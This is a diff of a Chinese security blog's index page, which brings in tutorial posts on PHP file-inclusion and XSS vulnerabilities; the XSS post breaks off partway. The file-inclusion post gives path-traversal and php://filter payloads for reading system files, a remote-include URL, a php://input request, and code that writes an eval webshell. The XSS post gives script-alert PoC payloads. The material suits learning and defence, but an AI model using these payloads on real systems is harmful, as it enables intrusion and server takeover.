@@ -1,100 +1,733 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="theme-color" content="#1a1a1a"><meta name="msapplication-navbutton-color" content="#1a1a1a"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><title>白尾青芳的小屋</title><script>(function() {
-  // 尽早应用暗色模式，防止闪烁
-  var savedDarkMode = localStorage.getItem('darkMode') === 'true';
-  if (savedDarkMode) {
-    document.documentElement.classList.add('dark-mode');
-  }
-})();
-</script><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&amp;family=Playfair+Display:wght@400;500;600;700&amp;family=Fira+Code:wght@400;500&amp;display=swap" rel="stylesheet"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"><script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="icon" href="/null">
-<link rel="stylesheet" href="/css/main.css">
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>白尾青芳的小屋</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="白尾青芳的小屋">
+<meta property="og:url" content="http://example.com/index.html">
+<meta property="og:site_name" content="白尾青芳的小屋">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="白尾青芳">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="白尾青芳的小屋" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
 
-<link rel="stylesheet" href="/css/tags.css">
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
 
-<link rel="stylesheet" href="/css/categories.css">
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
 
-<link rel="stylesheet" href="/css/categories-accordion.css">
+<meta name="generator" content="Hexo 8.1.1"></head>
 
-<link rel="stylesheet" href="/css/highlight.css">
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">白尾青芳的小屋</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS 订阅"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="搜索"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
 
-<link rel="stylesheet" href="/css/toc.css">
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-File-Include-任意文件包含" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/11/15/File-Include-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="article-date">
+  <time class="dt-published" datetime="2025-11-15T14:14:37.000Z" itemprop="datePublished">2025-11-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/11/15/File-Include-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">File Include 任意文件包含</a>
+    </h1>
+  
 
-<link rel="stylesheet" href="/css/image-zoom.css">
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="文件包含语句"><a href="#文件包含语句" class="headerlink" title="文件包含语句"></a>文件包含语句</h2><p>PHP中提供了四个文件包含语句</p>
+<table>
+<thead>
+<tr>
+<th>语句</th>
+<th>区别描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>include()</code></td>
+<td>多次包含，多次执行；<br>如果包含失败，脚本产生警告，继续运行。</td>
+</tr>
+<tr>
+<td><code>include_once()</code></td>
+<td>多次包含，一次执行；<br>如果包含失败，脚本产生警告，继续运行。</td>
+</tr>
+<tr>
+<td><code>require()</code></td>
+<td>多次包含，多次执行；<br>如果包含失败，脚本产生错误，结束执行。</td>
+</tr>
+<tr>
+<td><code>require_once()</code></td>
+<td>多次包含，一次执行；<br>如果包含失败，脚本产生错误，结束执行。</td>
+</tr>
+</tbody></table>
+<h2 id="相关配置"><a href="#相关配置" class="headerlink" title="相关配置"></a>相关配置</h2><p>文件包含是PHP 的基本功能之一,有本地文件包含与远程文件包含之分,本地文件包含可以读取和打开本地文件,远程文件包含<br>可以远程(方式)加载文件。</p>
+<p>可以通过php.ini 中的选项进行配置。</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">allow_url_fopen</span> = <span class="literal">On</span>/<span class="literal">Off</span>             <span class="comment"># 通过远程方式打开文件</span></span><br><span class="line"><span class="attr">allow_url_include</span> = <span class="literal">On</span>/<span class="literal">Off</span>           <span class="comment"># 通过远程方式包含文件</span></span><br></pre></td></tr></table></figure>
 
-<link rel="stylesheet" href="/css/share.css">
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">open_basedir</span> = /var/www/html      <span class="comment">#限制 PHP 脚本只能访问指定目录下的文件，防止越目录访问。</span></span><br></pre></td></tr></table></figure>
 
-<link rel="stylesheet" href="/css/mobile-nav.css">
 
-<link rel="stylesheet" href="/css/search.css">
 
-<link rel="stylesheet" href="/css/scrollbar.css">
+<p>多个路径可用冒号 :（Linux）或分号 ;（Windows）分隔。</p>
+<h2 id="动态包含"><a href="#动态包含" class="headerlink" title="动态包含"></a>动态包含</h2><h3 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//file-include.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;filepath&#x27;</span>]</span><br><span class="line">@<span class="keyword">include</span> <span class="variable">$fp</span></span><br></pre></td></tr></table></figure>
 
-<link rel="stylesheet" href="/css/timeline.css">
+<h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p>本地文件包含(Local File Include,LFI)通过本地路径访问到的文件。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filepath =.. /phpinfo.php</span><br></pre></td></tr></table></figure>
 
-<link rel="stylesheet" href="/css/animations.css">
+<h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>远程文件包含(Remote File Include,RFI),通过远程路径访问到的文件。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filepath=http:<span class="comment">//10.9.64.180/phpinfo.jpg</span></span><br></pre></td></tr></table></figure>
 
-<link rel="stylesheet" href="/css/ai-theme.css">
+<h1 id="漏洞总结"><a href="#漏洞总结" class="headerlink" title="漏洞总结"></a>漏洞总结</h1><h2 id="漏洞场景"><a href="#漏洞场景" class="headerlink" title="漏洞场景"></a>漏洞场景</h2><p>动态包含</p>
+<p>类似于文件读取的URL</p>
+<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>攻击者可以利用任意文件包含漏洞，读取文件，执行代码，对服务器造成危害。</p>
+<p>程序开发人员通常会把可重复使用函数或语句写到单个文件中，形成“封装”。在使用某个功能的时候，直接调用此文件，无需再次编写，提高代码重用性，减少代码量。这种调用文件的过程通常称为包含。</p>
+<p>程序开发人员都希望代码更加灵活，所以会把被包含的文件的路径设置为变量，来进行动态调用（包含），如果被包含文件的路径客户端可控，造成任意文件包含漏洞。</p>
+<p>几乎所有的脚本都会提供文件包含的功能，文件包含漏洞在PHP 的Web 应用中居多，在JSP&#x2F;ASP&#x2F;[<a target="_blank" rel="noopener" href="http://asp.net/">http://ASP.NET</a> 程序中比较少。</p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>PHP 文件包含是程序设计的基础功能之一，能够减少代码量，提高开发效率。但是使用文件包含功能时，实现了动态包含，就有产生文件包含漏洞的风险。如果实现动态包含的参数，Web 应用没有进行严格的校验，浏览器客户端用户可以影响控制被包含文件的路径，就会产生任意文件包含漏洞。</p>
+<ul>
+<li>动态包含</li>
+<li>被包含文件路径可控</li>
+</ul>
+<p>特点：</p>
+<ul>
+<li>无视扩展名读取文件内容</li>
+<li>无条件解析PHP代码，为图片木马提供了思路</li>
+</ul>
+<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>攻击者利用文件包含漏洞，可以：</p>
+<p>读取文件</p>
+<p>执行PHP代码</p>
+<p>直接获得网站后门</p>
+<p>控制网站</p>
+<p>控制服务器</p>
+<h2 id="漏洞评级"><a href="#漏洞评级" class="headerlink" title="漏洞评级"></a>漏洞评级</h2><p>高危</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="包含图片木马"><a href="#包含图片木马" class="headerlink" title="包含图片木马"></a>包含图片木马</h3><p>蚁剑直接连接</p>
+<h3 id="读取敏感文件"><a href="#读取敏感文件" class="headerlink" title="读取敏感文件"></a>读取敏感文件</h3><p>前提条件：</p>
+<p>目标文件存在（已知目标文件路径）</p>
+<p>具有文件可读权限</p>
+<p>具体方法：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 相对路径</span></span><br><span class="line">?<span class="attr">filepath</span> =.. / .. / .. / .. / .. / .. /windows/system32/drivers/etc/hosts</span><br><span class="line"><span class="comment"># 绝对路径</span></span><br><span class="line">?<span class="attr">filepath</span>=c:/windows/system32/drivers/etc/hosts</span><br><span class="line"><span class="comment"># 使用php封装协议</span></span><br><span class="line">?<span class="attr">filepath</span>=file://c:/windows/system32/drivers/etc/hosts</span><br></pre></td></tr></table></figure>
 
-<link rel="stylesheet" href="/css/loading-animation.css">
-<!-- 条件加载关于页面样式--><style>:root {
-  --primary-color: #1a1a1a;
-  --secondary-color: #666666;
-  --accent-color: #ff6b6b;
-  --background-color: #ffffff;
-  --text-color: #333333;
-  --overlay-color: rgba(0, 0, 0, 0.7);
-  --tag-background-color: #ffffff;
-  --card-background-color: #ffffff;
-}
-</style><link rel="stylesheet" href="https://cdn1.tianli0.top/gh/qxchuckle/Post-Summary-AI/chuckle-post-ai.css"><meta name="generator" content="Hexo 8.1.1"></head><body><div id="app"><header class="header navbar-bubble"><nav class="nav"><div class="nav-container"><div class="nav-logo"><a href="/"><span class="nav-title">白尾青芳的小屋</span></a></div><div class="nav-menu"><a class="nav-item active" href="/">首页</a><a class="nav-item" href="/about/">关于</a><a class="nav-item" href="/archives/">归档</a><a class="nav-item" href="/categories/">分类</a><a class="nav-item" href="/tags/">标签</a><div class="nav-item has-submenu"><span class="nav-link">网站</span><div class="submenu"><a class="submenu-item" href="https://example.com">示例网站</a></div></div><!-- 搜索按钮--><div class="search-toggle"><i class="fas fa-search"></i></div></div><div class="nav-toggle"><span></span><span></span><span></span></div></div></nav></header><div class="search-overlay"><div class="search-container"><div class="search-form"><input class="search-input" type="text" placeholder="搜索文章..."/><div class="search-close">×</div></div><div class="search-results"></div></div></div><main class="main"><section class="author-card-section"><div class="author-card-container"><div class="author-card author-card--with-bg author-card--large" style="background-image: url('/images/13.jpg')"><!-- 动态背景容器--><div class="author-avatar"><img src="/images/0.gif" alt="Author Avatar"/></div><div class="author-info"><h2 class="author-name">然</h2><p class="author-bio">人生而自由，却无往不在枷锁之中</p><div class="author-social"><a class="social-link" href="https://github.com/forever218" target="_blank" rel="noopener" title="GitHub"><i class="fab fa-github"></i></a><a class="social-link" href="https://space.bilibili.com/82657269" target="_blank" rel="noopener" title="Bilibili"><i class="fab fa-bilibili"></i></a><a class="social-link" href="mailto:mailto:3316703158@qq.com" title="Email"><i class="fas fa-envelope"></i></a></div><div class="author-cta"><a class="author-button" href="/about/">关于我</a></div></div></div></div></section><section class="articles-section"><div class="articles-container"><div class="articles-header"><div class="articles-filter"></div></div><div class="articles-grid"><article class="article-card article-card--large"><div class="article-image"><a href="/2025/11/15/File-Include-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><img src="/images/19.png" alt="File Include 任意文件包含" loading="lazy"/></a></div><div class="article-content"><div class="article-meta"><time class="article-date" datetime="2025-11-15T14:14:37.000Z">11月 15, 2025</time></div><h3 class="article-title"><a href="/2025/11/15/File-Include-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">File Include 任意文件包含</a></h3><div class="article-tags"></div></div></article><article class="article-card article-card--medium"><div class="article-image"><a href="/2025/11/15/Cross-Site-Scripting-XSS-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/"><img src="/images/19.png" alt="Cross Site Scripting XSS 跨站脚本攻击" loading="lazy"/></a></div><div class="article-content"><div class="article-meta"><time class="article-date" datetime="2025-11-15T14:14:09.000Z">11月 15, 2025</time></div><h3 class="article-title"><a href="/2025/11/15/Cross-Site-Scripting-XSS-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/">Cross Site Scripting XSS 跨站脚本攻击</a></h3><div class="article-tags"></div></div></article><article class="article-card article-card--small"><div class="article-image"><a href="/2025/11/15/SQL-injection-SQL%E6%B3%A8%E5%85%A5/"><img src="/images/19.png" alt="SQL injection SQL注入" loading="lazy"/></a></div><div class="article-content"><div class="article-meta"><time class="article-date" datetime="2025-11-15T12:58:06.000Z">11月 15, 2025</time></div><h3 class="article-title"><a href="/2025/11/15/SQL-injection-SQL%E6%B3%A8%E5%85%A5/">SQL injection SQL注入</a></h3><div class="article-tags"></div></div></article><article class="article-card article-card--wide"><div class="article-image"><a href="/2025/11/15/File-Upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><img src="/images/19.png" alt="File Upload 任意文件上传" loading="lazy"/></a></div><div class="article-content"><div class="article-meta"><time class="article-date" datetime="2025-11-15T12:43:20.000Z">11月 15, 2025</time></div><h3 class="article-title"><a href="/2025/11/15/File-Upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">File Upload 任意文件上传</a></h3><div class="article-tags"></div></div></article></div></div></section></main><footer class="footer"><div class="footer-bottom"><div class="footer-copyright">© 2025 李思然. All rights reserved.</div><!-- Footer centered image with link--><div class="footer-image" style="text-align: center; margin: 15px 0;"><a href="https://www.upyun.com/?utm_source=lianmeng&amp;utm_medium=referral" target="_blank" rel="noopener noreferrer"><img src="https://s21.ax1x.com/2024/08/23/pAFm0cq.png" alt="Footer Image" style="max-width: 100%; height: auto;"/></a></div><div class="footer-badges"><a target="_blank" rel="noopener" href="https://hexo.io/" title="博客框架为Hexo_v5.4.0"><img src="https://npm.elemecdn.com/anzhiyu-blog@2.1.5/img/badge/Frame-Hexo.svg" alt="博客框架为Hexo_v5.4.0"/></a><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/" title="本站已在粤网管局备案"><img src="https://img.shields.io/badge/粤ICP备-2022157092号-yellow.svg?logo=data:image/png;base64,UklGRjgCAABXRUJQVlA4WAoAAAAQAAAAEwAAEwAAQUxQSJgAAAABgKpt//nn+RvZ89KuNVcbR6C6pBNYW12zl61oO23Vtu2/v59TiIgJILircnOrKgLlzL4Pj8fj+RkuUTB7FE0hIuZVxs1B4r88yudxAakeYQIQsSiZiYVaj7ge2mS9cCbbgTfZIYzJmmFVtgQ/slsolaUB5Y9qtzkAmRdqN0EmPMKBAGvjq8pRnTYAbBVdK9unpytTDQVaAFZQOCB6AQAAEAgAnQEqFAAUAD6RQJhJpaOiISgKqLASCWwAnTKEeZ+Z8UG4b3S8Uuxj0APK49jD9jvRsJlHSAAk4peJdT29v1IEVadPwR6oAAD+BVzylNKb2DP80JoQLtKM1HYe/A2NwP2FBXtSNypNu+PttP+EadMJsrmm/ULTvb6jEqpziSt//sRMcbrAVYftaY1KNWWudr1AdlUv5D5HRoEfwcV0Pu9dhsXZ3ojpXwjGWWBJfv4puUOV9aczt7uvE8SHYSo33C18yNeqL9sZ211bKOY/rjT8Wzi9Wg+hj7Xvi/3NC1proBfzmpWysW6y3/63VcYMlVBx6v5o9WNvzL1XLvbR7wTooDXtSEjt6rJoaazbMoXie0mzg0G+evKLZ8vz/yKv/u4RDK0EF+ejNfOOU0ZhepG6b/Ewbk1BofcYZC8JB4a2NPUtwhHtqE3tVT8PlHEvlf+xYFbG7Wms4JVHiSMfc36K5LOwcwC89RYMLn0jFD1wQF2/QrJAAAAA" alt="本站已在粤网管局备案"/></a><a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"><img src="https://npm.elemecdn.com/anzhiyu-blog@2.2.0/img/badge/Copyright-BY-NC-SA.svg" alt="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"/></a></div></div></footer></div><!-- 立即应用暗色模式，避免页面闪烁--><script>(function() {
-  // 检查本地存储中的暗色模式设置
-  const savedDarkMode = localStorage.getItem('darkMode') === 'true';
-  // 如果设置为暗色模式，立即应用到body
-  if (savedDarkMode) {
-    document.body.classList.add('dark-mode');
-  }
+<table>
+<thead>
+<tr>
+<th>封装协议</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>file://</code></td>
+<td>访问本地文件系统</td>
+</tr>
+<tr>
+<td><code>http://</code></td>
+<td>访问 HTTP(s) 网址</td>
+</tr>
+<tr>
+<td><code>ftp://</code></td>
+<td>访问 FTP(s) URLs</td>
+</tr>
+<tr>
+<td><code>php://</code></td>
+<td>访问各个输入&#x2F;输出流（I&#x2F;O streams）</td>
+</tr>
+<tr>
+<td><code>zlib://</code></td>
+<td>压缩流</td>
+</tr>
+<tr>
+<td><code>data://</code></td>
+<td>数据（RFC 2397）</td>
+</tr>
+<tr>
+<td><code>glob://</code></td>
+<td>查找匹配的文件路径模式</td>
+</tr>
+<tr>
+<td><code>phar://</code></td>
+<td>PHP 归档</td>
+</tr>
+<tr>
+<td><code>ssh2://</code></td>
+<td>Secure Shell 2</td>
+</tr>
+<tr>
+<td><code>rar://</code></td>
+<td>RAR</td>
+</tr>
+<tr>
+<td><code>ogg://</code></td>
+<td>音频流</td>
+</tr>
+<tr>
+<td><code>expect://</code></td>
+<td>处理交互式的流</td>
+</tr>
+</tbody></table>
+<h3 id="读取PHP文件源码"><a href="#读取PHP文件源码" class="headerlink" title="读取PHP文件源码"></a>读取PHP文件源码</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attr">filepath</span>=php://filter/read=convert.base64-encode/resource=[目标文件]</span><br></pre></td></tr></table></figure>
 
-  // 防止页面闪烁，在DOM加载完成前设置一个初始类
-  document.documentElement.style.visibility = 'hidden';
-  document.addEventListener('DOMContentLoaded', function() {
-    document.documentElement.style.visibility = 'visible';
-  });
-})();
-</script>
-<script src="/js/main.js"></script>
+<p>read&#x3D;convert.base64-encode:以base64编码形式读取文件</p>
+<h3 id="执行PHP命令"><a href="#执行PHP命令" class="headerlink" title="执行PHP命令"></a>执行PHP命令</h3><p>利用条件：</p>
+<p>利用php:&#x2F;&#x2F;input执行PHP命令</p>
+<p>远程文件包含开启</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /file-include/include.php?<span class="attr">filepath</span>=php://input HTTP/<span class="number">1.1</span></span><br><span class="line">Host: 192.168.111.15</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11<span class="comment">; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0</span></span><br><span class="line">Accept: text/html, application/xhtml+xml, application/xml<span class="comment">; q=0.9,image/webp,*/ *; q=0.8</span></span><br><span class="line">Accept-Language: en-US, en<span class="comment">; q=0.5</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: <span class="attr">PHPSESSID</span>=q91c0vlnggvo7kogh6j01a3582</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Content-Length: 18</span><br><span class="line"></span><br><span class="line">&lt;? php phpinfo() <span class="comment">;? &gt;</span></span><br></pre></td></tr></table></figure>
 
-<script src="/js/tags.js"></script>
+<h3 id="包含图片码写Shell"><a href="#包含图片码写Shell" class="headerlink" title="包含图片码写Shell"></a>包含图片码写Shell</h3><p>条件：</p>
+<p>确定文件包含漏洞存在</p>
+<p>蚁剑不能直接连接</p>
+<p>写shell：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&#x27;w&#x27;</span> ),<span class="string">&#x27; &lt;?= @eval($_REQUEST[777]) ;phpinfo() ;? &gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span> php <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27; &lt;? php @eval($_REQUEST[777])?&gt;&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<script src="/js/categories-accordion.js"></script>
+<p>再用蚁剑连接</p>
+<h3 id="包含日志"><a href="#包含日志" class="headerlink" title="包含日志"></a>包含日志</h3><p>Apache 日志:</p>
+<p>· 访问日志</p>
+<p>· 错误日志</p>
+<p>Nginx 日志:</p>
+<p>· 访问日志</p>
+<p>· 错误日志</p>
+<p>SSH 日志</p>
+<p>邮件日志</p>
+<h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><p>尽量少的使用文件包含</p>
+<p>严格过滤被包含文件的路径</p>
+<p>将参数allow_url_include设置为Off</p>
+<p>使用参数open_basedir限定文件访问范围</p>
+<h2 id="漏洞案例"><a href="#漏洞案例" class="headerlink" title="漏洞案例"></a>漏洞案例</h2><p>metinfo_5.0.4_file-include</p>
 
-<script src="/js/highlight.js"></script>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/11/15/File-Include-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" data-id="cuid3YILlouuBJWbkzELQwcDp" data-title="File Include 任意文件包含" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
 
-<script src="/js/load-more.js"></script>
 
-<script src="/js/header-scroll.js"></script>
 
-<script src="/js/toc.js"></script>
+  
+    <article id="post-Cross-Site-Scripting-XSS-跨站脚本攻击" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/11/15/Cross-Site-Scripting-XSS-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/" class="article-date">
+  <time class="dt-published" datetime="2025-11-15T14:14:09.000Z" itemprop="datePublished">2025-11-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/11/15/Cross-Site-Scripting-XSS-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/">Cross Site Scripting XSS 跨站脚本攻击</a>
+    </h1>
+  
 
-<script src="/js/image-zoom.js"></script>
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>跨站点脚本(Cross Site Scripting, XSS)是指客户端代码注入攻击，攻击者可以在一些网站或Web应用程序中执行恶意脚本，当Web应用程序在其生成的输出中使用未经验证或未编码的用户输入时，就会发生XSS。</p>
+<p>注意：<br>等待受害者访问被注入恶意代码的网站，很被动，称为盲打<br>XSS攻击目标是客户端浏览器用户，由于浏览器种类不同，攻击效果不同，对于同一款浏览器，攻击效果也会不同</p>
+<p>用一段简单的代码，用以验证和检测漏洞的存在，这样的代码叫做POC(Proof of Concept)。验证XSS漏洞的代码有：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="regexp">/xss/</span>);&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">confirm</span>(<span class="regexp">/xss/</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&#x27;xss&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">prompt</span>(<span class="regexp">/xss/</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
 
-<script src="/js/share.js"></script>
+<p>如果页面弹窗，浏览器把用户提交的字符串当作JS来执行，并且执行成功，说明XSS漏洞存在</p>
+<h2 id="XSS漏洞分类"><a href="#XSS漏洞分类" class="headerlink" title="XSS漏洞分类"></a>XSS漏洞分类</h2><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>非持久性的，参数型的跨站脚本。反射型的XSS代码在Web应用的参数中，如搜索框的反射型XSS<br><strong><a target="_blank" rel="noopener" href="http://10.4.7.234/cms/search.php?keywords=%3Cscript%3Ealert(/xss/)%3C/script%3E&button=%E6%90%9C%E7%B4%A2">http://10.4.7.234/cms/search.php?keywords=%3Cscript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E&amp;button=%E6%90%9C%E7%B4%A2</a></strong><br>此例中XSS代码出现在keyword参数中。容易被发现，利用难度高，很多漏洞提交平台并不接收反射型XSS</p>
+<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>持久性跨站脚本。持久性体现在XSS代码不是在某个参数或变量中，而是写进数据库或文件等可以永久保存数据的介质中。存储型XSS一般写在留言板等地方，可以在留言板等位置留言，将XSS代码写入数据库中<br>危害面较广，漏洞提交平台会接收此类漏洞</p>
+<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>攻击的代码是由于修改受害者浏览器页面的DOM树执行的。特殊的地方就是攻击代码(payload)在本地修改DOM树执行的，并不会将参数提交到服务器，因此DOM型XSS很难被检测<br>注意：修改DOM树执行</p>
+<p>采用#的方式，参数不会提交到服务器</p>
+<h1 id="漏洞总结"><a href="#漏洞总结" class="headerlink" title="漏洞总结"></a>漏洞总结</h1><h2 id="漏洞场景"><a href="#漏洞场景" class="headerlink" title="漏洞场景"></a>漏洞场景</h2><p>在搜索框、留言板、登录框、聊天室等一切收集用户输入的地方，并且捕获用户输入之后，会将用户的输入回显在网页中，就容易产生XSS 漏洞。</p>
+<p>常见攻击场景：</p>
+<p>固定会话攻击</p>
